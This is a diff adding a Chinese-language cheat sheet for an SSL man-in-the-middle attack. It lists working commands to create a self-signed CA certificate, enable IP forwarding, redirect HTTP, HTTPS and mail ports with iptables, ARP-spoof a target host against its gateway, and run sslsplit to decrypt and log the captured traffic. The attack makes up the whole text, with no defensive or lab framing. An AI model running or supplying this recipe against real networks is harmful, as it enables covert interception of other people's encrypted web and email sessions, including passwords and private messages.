@@ -1,0 +1,39 @@
+SSL中間人證書攻擊
+
+sslsplit:
+sudo apt-get install sslsplit
+
+
+===============================
+製作自簽的電子證書
+===============================
+mkdir -p $HOME/sslsplit/logdir
+產生一個私鑰
+openssl genrsa -out $HOME/sslsplit/ca.key 2048
+製作一張自簽的電子證書
+openssl req -new -x509 -days 1096 -key $HOME/sslsplit/ca.key -out $HOME/sslsplit/ca.crt
+
+===============================
+端口轉發
+===============================
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
+iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443
+
+查看設定
+iptables -t nat -L
+
+===============================
+ARP欺騙
+===============================
+arpspoof -i eth0 -t 192.168.1.110 -r 192.168.1.1
+
+===============================
+SSLSplit
+===============================
+sslsplit -D -l $HOME/sslsplit/connect.log -j $HOME/sslsplit/ -S $HOME/sslsplit/logdir/ -k $HOME/sslsplit/ca.key -c $HOME/sslsplit/ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
+
